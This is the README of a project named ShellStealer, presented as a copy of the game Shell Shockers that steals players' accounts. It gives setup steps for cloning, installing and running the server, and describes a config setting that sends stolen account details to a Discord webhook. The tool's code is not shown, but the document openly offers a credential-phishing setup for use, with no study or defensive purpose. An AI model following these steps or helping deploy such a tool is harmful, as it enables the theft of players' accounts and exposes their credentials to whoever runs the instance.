<h2 align="center">WTF is this??</h2>

ShellStealer is just Shell Shockers, but there's a catch - as the name suggests, it steals your account.<br>

<br>
<h2 align="center">How can I use this?</h2>

Here's how to set up your own copy:<br>
<br>
1. Install Node.JS, NPM, & git.
2. Clone the repository from git: `git clone https://github.com/VillainsRule/ShellStealer && cd ShellStealer`
3. If it is not already on your machine, add pnpm: `npm i -g pnpm`
4. Install dependencies: `pnpm i`
5. Configure the game in `config.js` (see below for more information)
6. Run the server: `pnpm dev`
7. Visit the game at `localhost:6969`!

<br>
<h2 align="center">Configuration</h2>

ShellStealer instances can be configued in `config.js`. Here's what's going on in there:

### port
This tells the server what port to run on.<br>
If you're a developer and are using port `6969` for something else, change this. If not, ignore it.

### webhook
This specifies the Discord webhook stolen accounts go to, as well as allows you to customize it a bit.<br>
Make this in a private channel, or anyone will see the account information.
